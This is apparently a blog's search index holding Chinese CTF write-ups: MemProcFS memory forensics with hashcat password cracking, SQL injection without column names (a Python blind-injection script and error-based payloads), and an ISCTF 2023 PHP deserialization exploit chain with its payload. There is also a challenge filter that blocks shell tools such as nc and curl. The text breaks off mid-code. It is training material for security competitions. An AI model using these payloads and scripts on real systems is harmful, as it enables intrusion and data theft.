<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>MemProcFS 内存取证</title>
    <link href="/2023/12/05/MemProcFS%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/12/05/MemProcFS%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>ok啊，kali没内存了，vol用不上<br>刚好接触新工具MemProcFS，很直观能看到各种文件，不用记命令<br>但是第一次用不太熟，也没看到啥文章，一个个横冲直撞的找文件很煎熬<br>注册表这种也是看不懂<br>道阻且长</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><code>pip install leechcorepyc</code><br><a href="https://github.com/ufrisk/MemProcFS/releases">https://github.com/ufrisk/MemProcFS/releases</a><br>安装最新版本<br>解压即可食用</p><h2 id="某医疗行业赛取证"><a href="#某医疗行业赛取证" class="headerlink" title="某医疗行业赛取证"></a>某医疗行业赛取证</h2><h3 id="鱼叉攻击场景溯源-1"><a href="#鱼叉攻击场景溯源-1" class="headerlink" title="鱼叉攻击场景溯源_1"></a>鱼叉攻击场景溯源_1</h3><p>题目内容：<br>某医院门诊挂号系统遭遇钓鱼攻击，系统内被植入木马程序，现请你对该场景下受灾系统进行分析溯源并回答如下问题。<br>（本题附件名：yuchagongji.7z）<br>请分析受灾系统的主机基本信息（答案格式为flag{系统主机名+系统用户名+系统用户SID+操作系统构建build编号+主机网卡的固定IP地址的md5值}<br>例如：系统主机名为weiruan，系统用户名为user1，系统用户SID为S-1-4-18-3218096128-1257898252-2035427519-1003，操作系统构建build编号为20230，主机网卡的固定IP地址为192.168.20.23，flag即为flag{md5(weiruan+user1+S-1-4-18-3218096128-1257898252-2035427519-1003+20230+192.168.20.23)}即flag{41e10eec498a50be9591c8e641aafcf3}<br><code>.\MemProcFS.exe -device \Desktop\forensic.raw -forensic 0</code> （相关命令可以参考<a href="https://github.com/ufrisk/MemProcFS/wiki/_CommandLine">https://github.com/ufrisk/MemProcFS/wiki/_CommandLine</a><br><img src="/mdimg/memprocfs/1.png"><br>此时这个工具给我们生成了一个虚拟磁盘（默认是M 如果M已经存在，加上-mount Z 指定别名<br><img src="/mdimg/memprocfs/2.png"><br>在sys目录下存放了系统相关信息<br><img src="/mdimg/memprocfs/3.png"><br>在sys目录下可以得到以下信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">系统主机名             CORE-<span class="hljs-number">2023</span><br>系统用户名                           H_admin     <span class="hljs-regexp">//</span> 在sys<span class="hljs-regexp">/users/</span><br>系统用户SID             S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3114095118</span>-<span class="hljs-number">2402888954</span>-<span class="hljs-number">2065529513</span>-<span class="hljs-number">1001</span>    <span class="hljs-regexp">//</span> 在sys<span class="hljs-regexp">/users/</span><br>操作系统构建build编号     <span class="hljs-number">22621</span><br></code></pre></td></tr></table></figure><p><code>sys/net</code>目录下存放了服务及网卡监听端口信息，里面有本机ip<br><img src="/mdimg/memprocfs/4.png"><br><code>192.168.52.130</code><br>flag<br><code>CORE-2023+H_admin+S-1-5-21-3114095118-2402888954-2065529513-1001+22621+192.168.52.130 ``flag&#123;e2e33285c9d60df458717e45c3bcfe01&#125; </code></p><h3 id="鱼叉攻击场景溯源-2"><a href="#鱼叉攻击场景溯源-2" class="headerlink" title="鱼叉攻击场景溯源_2"></a>鱼叉攻击场景溯源_2</h3><p>题目内容：<br>遭受钓鱼攻击的不当操作源头网络信息为（答案格式为flag{钓鱼攻击使用网站标题+钓鱼攻击使用的恶意程序http下载链接的md5值，例如<a href="http://192.168.150.1/test.zip/">http://192.168.150.1/test.zip/</a>，链接目录结尾保留“/”}）<br>例如：钓鱼攻击使用网站标题是”系统检查”,钓鱼攻击使用的恶意程序http下载链接是<a href="http://192.168.20.23:9999/hello.zip/">http://192.168.20.23:9999/hello.zip/</a>，flag即为flag{md5(系统检查+<a href="http://192.168.20.23:9999/hello.zip/">http://192.168.20.23:9999/hello.zip/)</a>)}即flag{8d58631224fd41cb30d94edb9e1e9b77}<br>这里直接010打开镜像文件检索<code>[http://192](http://192)</code> 右下角改为显示文本和utf-8编码<br><img src="/mdimg/memprocfs/5.png"><br>得到下载链接<br><code>http://192.168.2.113:2222/Patch_Update.zip/</code><br>网站标题<br><code>医疗系统补丁更新下载站</code><br>这里有一个工具<a href="https://www.gimp.org/">GIMP - GNU Image Manipulation Program</a> 是一个类似ps的图像编辑器<br>可以导入如.raw的镜像来查看数据<br>找到<code>M:\name\msedge.exe-7276\minidump</code> 的<code>.dmp</code>文件 改后缀为<code>.data</code>然后拖进gimp<br>调整图像宽高可以看到<br><img src="/mdimg/memprocfs/6.png"></p><h3 id="鱼叉攻击场景溯源-3"><a href="#鱼叉攻击场景溯源-3" class="headerlink" title="鱼叉攻击场景溯源_3"></a>鱼叉攻击场景溯源_3</h3><p>题目内容：<br>请分析钓鱼攻击使用的恶意程序软件，还原恶意程序软件名及植入木马程序的命令(答案格式为flag{恶意程序软件名+恶意命令的小写md5值}，恶意程序软件名包括文件名和文件大写扩展名，例如name.EXE，去除恶意命令中的“,”号，命令中空格间隔均为1个)<br>例如恶意程序软件名是shell.exe,恶意命令为curl.exe <a href="http://www.baidu.com,flag即为flag{md5/">www.baidu.com,flag即为flag{md5</a>(shell.exe+curl.exe <a href="http://www.baidu.com)}即flag{4b17c1d9b0e22e773554f91994db048b}/">www.baidu.com)}即flag{4b17c1d9b0e22e773554f91994db048b}</a><br>待定</p><h3 id="鱼叉攻击场景溯源-4"><a href="#鱼叉攻击场景溯源-4" class="headerlink" title="鱼叉攻击场景溯源_4"></a>鱼叉攻击场景溯源_4</h3><p>题目内容：<br>钓鱼攻击后该系统被植入的木马程序为（答案格式为flag{木马程序软件名+木马程序回连地址的md5值}，回连地址格式为ip:port，例如192.168.150.1:443）<br>例如192.168.150.1:443对应的flag是flag{md5(192.168.150.1:443)}即flag{05bb4939f4da0952d17f3a8fec3fbbf2}<br>查看<code> &quot;M:\sys\net\netstat-v.txt&quot;</code> 文件<br><img src="/mdimg/memprocfs/7.png"><br>可以看到这个helper.exe是上面钓鱼网站下载下来的木马程序<br>并且可以得到与主机通讯连接的ip端口 为 <code>192.168.2.120:8023</code></p><h3 id="鱼叉攻击场景溯源-5"><a href="#鱼叉攻击场景溯源-5" class="headerlink" title="鱼叉攻击场景溯源_5"></a>鱼叉攻击场景溯源_5</h3><p>题目内容：<br>该受灾系统曾经备份过的操作用户表中的admin用户明文为（答案格式为flag{admin用户明文密码的16进制值的md5值}，密码破解字典可使用kali自带密码本进行）<br>例如：admin明文是hello123，对应的16进制值就是68656c6c6f313233，md5值就是md5(68656c6c6f313233)最终结果为d2c4b16c3624a40efc2f28d7aa54f8c2，再加上flag{}即flag{d2c4b16c3624a40efc2f28d7aa54f8c2}<br>找到记事本的进程 <code>M:\name\Notepad.exe-4920</code><br><code>M:\name\Notepad.exe-4920\minidump</code> 把.bmp改为.data 然后gimp打开<br><img src="/mdimg/memprocfs/8.png"><br><code>6d1ce7aa0a1d988dc96a2abcd187b45a</code><br>用hashcat爆破<br><code>hashcat -a 0 -m 0 6d1ce7aa0a1d988dc96a2abcd187b45a ./misc/rockyou.txt</code><br><img src="/mdimg/memprocfs/9.png"><br><code>aptx4869</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无列名注入</title>
    <link href="/2023/12/04/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/12/04/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p><strong>通常情况是columns被ban了或者information被ban了 等读取不到列名的情况</strong></p><h3 id="information被ban时可以用以下表获取表名然后配合无列名注入"><a href="#information被ban时可以用以下表获取表名然后配合无列名注入" class="headerlink" title="information被ban时可以用以下表获取表名然后配合无列名注入"></a>information被ban时可以用以下表获取表名然后配合无列名注入</h3><p>注：sys库需要root权限才能访问。innodb在mysql中是默认关闭的。</p><h4 id="InnoDb"><a href="#InnoDb" class="headerlink" title="InnoDb"></a>InnoDb</h4><p>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，<strong>但是没有存储列名</strong>。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">mysql.innodb<span class="hljs-emphasis">_table_stats</span><br><span class="hljs-emphasis">mysql.innodb_index_</span>stats<br></code></pre></td></tr></table></figure><h4 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h4><p>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取<strong>表名</strong>。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">sys.schem<span class="hljs-built_in">a_auto</span>_increment_columns<br>sys.schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br>sys.x$schem<span class="hljs-built_in">a_table</span>_statistics_with_buffer<br>sys.x$schem<span class="hljs-built_in">a_table</span>_statistics<br>sys.x$ps_schem<span class="hljs-built_in">a_table</span>_statistics_io<br>sys.x$schem<span class="hljs-built_in">a_flattened</span>_keys<br></code></pre></td></tr></table></figure><h3 id="没ban掉union可以用设置别名的方式来绕过列名"><a href="#没ban掉union可以用设置别名的方式来绕过列名" class="headerlink" title="没ban掉union可以用设置别名的方式来绕过列名"></a>没ban掉union可以用设置别名的方式来绕过列名</h3><p><strong>union可以构造一个虚拟表</strong><br><code> select 1,2,3,4 union select *from teacher</code><br><img src="/mdimg/wlmzr/1.png"><br>**select的字段数要和table一样 **<br>后面就可以用<br><code>select </code>2<code> from (select 1,2,3,4 union select *from teacher)n //n不可省略(作用是设置别名)</code><br><img src="/mdimg/wlmzr/2.png"><br>这种来读取数据而不需要知道原先表的列名<br>ban了````时可以设置别名 <code>as</code>可以省略<br><code>select b from (select 1 a,2 b,3 c,4 d union select *from teacher)n</code><br><img src="/mdimg/wlmzr/3.png"></p><h3 id="通过ascii位移无列名注入"><a href="#通过ascii位移无列名注入" class="headerlink" title="通过ascii位移无列名注入"></a>通过ascii位移无列名注入</h3><p>首先可以通过类似这样的语句爆出字段数<br><code>(select 1,2,3) &gt; (select *from teacher)</code><br>字段数相等会返回1，不相等则会报错<br><img src="/mdimg/wlmzr/4.png"><br>然后可以通过比较ascii大小来爆出数据<br><img src="/mdimg/wlmzr/5.png"><br>实际上是比较每一个字符的ascii 然后返回0 false 或者 1 true<br>然后可以比较表中数据来盲注<br><code>select (select &#39;flag&#39;) &gt; (select *from test)</code><br><img src="/mdimg/wlmzr/6.png"><br>跟&gt;的布尔盲注类似 返回1的前一个ASCII字符就是表中数据<br>贴个jio本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span>  requests<br><br>baseurl=<span class="hljs-string">&quot;http://17d5864a-27fc-4fc7-be88-e639f3f55898.node4.buuoj.cn:81/index.php&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">flag</span>):<br>    res=<span class="hljs-string">&#x27;&#x27;</span><br>    res+=flag<br>    <span class="hljs-keyword">return</span> res<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        datachar = add(flag+<span class="hljs-built_in">chr</span>(char)) <span class="hljs-comment">#增加下一个比对的字符串</span><br>        payload=<span class="hljs-string">&#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="hljs-built_in">format</span>(datachar)<br>        data = &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>:payload<br>        &#125;<br>        req=requests.post(url=baseurl,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Nu1L&quot;</span> <span class="hljs-keyword">in</span> req.text:<br>            flag += <span class="hljs-built_in">chr</span>(char-<span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> req.status_code == <span class="hljs-number">429</span>:<br>            time.sleep(<span class="hljs-number">0.5</span>)<br></code></pre></td></tr></table></figure><h3 id="ban-了columns-但没ban掉information"><a href="#ban-了columns-但没ban掉information" class="headerlink" title="ban 了columns 但没ban掉information"></a>ban 了columns 但没ban掉information</h3><p>join 的作用是连接两个表<br>在使用别名的时候，表中不能出现相同的字段名<br><code>(select * from (select * from test as a join test as b) as c);</code><br><strong>a、b是同一个表连接，有相同的字段，select c(别名) 时 会报错出相同的列名</strong><br>ps：<br>SELECT *时，USING会去除USING指定的列 ，可以用来爆破其他列名<br><code>(select * from (select * from test as a join test as b using(id)) as c);</code></p><h3 id="NISACTF-2022-join-us"><a href="#NISACTF-2022-join-us" class="headerlink" title="[NISACTF 2022]join-us"></a>[NISACTF 2022]join-us</h3><p><strong>fuzz</strong><br>过滤了：</p><ul><li>database</li><li>= //用 like</li><li>union</li><li>and //用 or</li><li>columns</li><li>sleep</li><li>updatexml //extractvalue</li><li>substr //mid or limit</li><li>left</li><li>right</li></ul><p>ban了database<br><code>tt=1&#39;or(select *from a)#</code>  通过不存在的表爆出库名 sqlsql<br>不知道为什么这里用<code>or</code>就不行要用 <code>||</code><br><code>tt=1&#39; || (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like &#39;sqlsql&#39;))))# </code><br>表：<code>Fal_flag , output</code><br><code>columns</code>被ban了<br>无列名注入：<br>这里<code>as</code>被ban了<br>可以省略as 设置别名<br><code>tt=1&#39;||extractvalue(0,concat(0x7e,(select * from (select * from output a join output b) c)))#</code><br>-&gt;  data<br><code>tt=1&#39;||extractvalue(0,concat(0x7e,(select * from (select * from Fal_flag a join Fal_flag b) c)))#</code><br>-&gt;  id<br>爆数据<br><code>tt=1&#39;||extractvalue(0,concat(0x7e,(select data from output)))#</code><br>-&gt;   NSSCTF{752a1163-4e92-47d5-91<br><code>tt=1&#39;||extractvalue(0,concat(0x7e,mid((select data from output),29,48)))#</code><br>-&gt;   9b-ef75c021f69e}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCTF 2023 wp</title>
    <link href="/2023/11/29/ISCTF%202023/"/>
    <url>/2023/11/29/ISCTF%202023/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="绕进你的心里"><a href="#绕进你的心里" class="headerlink" title="绕进你的心里"></a>绕进你的心里</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://43.249.195.138:22515/?hongmeng[]=1&amp;shennong[]=2&amp;zhurong[]=1&quot;</span><br>data=&#123;<br>    <span class="hljs-string">&#x27;pan[gu&#x27;</span>:<span class="hljs-string">&#x27;very&#x27;</span>*<span class="hljs-number">250000</span>+<span class="hljs-string">&#x27;2023ISCTF&#x27;</span><br>&#125;<br>r=requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h3 id="where-is-the-flag"><a href="#where-is-the-flag" class="headerlink" title="where_is_the_flag"></a>where_is_the_flag</h3><p>flag.php flag2 env</p><h3 id="圣杯战争"><a href="#圣杯战争" class="headerlink" title="圣杯战争!!!"></a><strong>圣杯战争!!!</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">artifact</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$excalibuer</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$arrow</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;为Saber选择了对的武器!&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;excalibuer-&gt;arrow;<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">prepare</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$release</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>    <span class="hljs-variable">$functioin</span> = <span class="hljs-variable language_">$this</span>-&gt;release;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;蓄力!咖喱棒！！&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$functioin</span>();<br>  &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">saber</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$weapon</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;胜利！&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;weapon);<br>  &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">summon</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$Saber</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$Rider</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;开始召唤从者！&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;Saber;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>  <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125;<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>链子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">summon::<span class="hljs-title function_ invoke__">__wakeup</span>()-&gt;artifact::<span class="hljs-title function_ invoke__">__toString</span>()-&gt;prepare::<span class="hljs-title function_ invoke__">__get</span>()-&gt;saber::<span class="hljs-title function_ invoke__">__invoke</span>()::<span class="hljs-keyword">include</span>()<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">artifact</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$excalibuer</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arrow</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;excalibuer-&gt;arrow;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">prepare</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$release</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$functioin</span> = <span class="hljs-variable language_">$this</span>-&gt;release;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$functioin</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">saber</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$weapon</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;weapon);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">summon</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Saber</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;Saber;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> summon;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> artifact;<br><span class="hljs-variable">$a</span>-&gt;Saber=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">prepare</span>();<br><span class="hljs-variable">$b</span>-&gt;excalibuer=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Saber</span>;<br><span class="hljs-variable">$d</span>-&gt;weapon=<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<br><span class="hljs-variable">$c</span>-&gt;release=<span class="hljs-variable">$d</span>;<br><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// O:6:&quot;summon&quot;:1:&#123;s:5:&quot;Saber&quot;;O:8:&quot;artifact&quot;:2:&#123;s:10:&quot;excalibuer&quot;;O:7:&quot;prepare&quot;:1:&#123;s:7:&quot;release&quot;;O:5:&quot;saber&quot;:1:&#123;s:6:&quot;weapon&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;s:5:&quot;arrow&quot;;N;&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="wafr"><a href="#wafr" class="headerlink" title="wafr"></a><strong>wafr</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Read /flaggggggg.txt</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123; <span class="hljs-comment">//strings</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;想读我文件？大胆。&quot;</span>);<br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\^|\||\~|\\$|\%|jay/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;无字母数字RCE？大胆！&quot;</span>);<br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/bash|nc|curl|sess|\&#123;|:|;/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;奇技淫巧？大胆！！&quot;</span>);<br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/fl|ag|\.|x/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;大胆！！！&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 